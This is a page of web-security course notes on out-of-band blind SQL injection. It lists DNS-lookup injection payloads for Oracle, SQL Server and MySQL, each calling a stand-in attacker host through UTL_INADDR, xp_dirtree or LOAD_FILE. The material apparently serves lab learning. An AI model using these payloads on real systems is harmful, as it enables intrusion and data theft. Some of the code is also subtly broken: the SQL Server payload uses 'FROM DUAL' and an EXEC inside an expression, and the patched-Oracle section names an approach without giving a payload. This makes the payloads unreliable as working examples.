---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Database-Specific Payloads

The effectiveness of the SQL injection payload depends on the type of database being targeted. Different databases have different functions and syntax for performing DNS lookups.

### Oracle Database

For Oracle, the payload might involve the `UTL_INADDR` package, which provides functions for network address resolution.

#### Unpatched Oracle

```sql
SELECT * FROM products WHERE name = 'search_term' OR (SELECT NULL FROM DUAL WHERE (SELECT COUNT(*) FROM ALL_USERS WHERE USERNAME='SYS') > 0 AND UTL_INADDR.GET_HOST_ADDRESS('attacker-subdomain.birpcollaborator.com') IS NOT NULL);
```

#### Patched Oracle

If the Oracle database is fully patched, the attacker might need to use a different approach, such as leveraging a PL/SQL function to perform the DNS lookup.

### Microsoft SQL Server

For Microsoft SQL Server, the payload might involve the `xp_dirtree` extended stored procedure, which can be used to perform directory operations, including DNS lookups.

```sql
SELECT * FROM products WHERE name = 'search_term' OR (SELECT NULL FROM DUAL WHERE (SELECT COUNT(*) FROM sysobjects WHERE xtype='U') > 0 AND (EXEC master..xp_dirtree '\\attacker-subdomain.birpcollaborator.com\dir', 1, 1) = 1);
```

### MySQL Database

For MySQL, the payload might involve the `LOAD_FILE()` function, which can be used to read files from the filesystem, potentially triggering a DNS lookup.

```sql
SELECT * FROM products WHERE name = 'search_term' OR (SELECT NULL FROM DUAL WHERE (SELECT COUNT(*) FROM mysql.user WHERE user='root') > 0 AND LOAD_FILE('\\\\attacker-subdomain.birpcollaborator.com\\file.txt') IS NOT NULL);
```

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/02-Introduction to SQL Injection|Introduction to SQL Injection]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/00-Overview|Overview]] | [[Web Security (PortSwigger)/02-SQL Injection/16-Lab 15 Blind SQL injection with out of band interaction/04-How to Prevent  Defend Against SQL Injection|How to Prevent  Defend Against SQL Injection]]
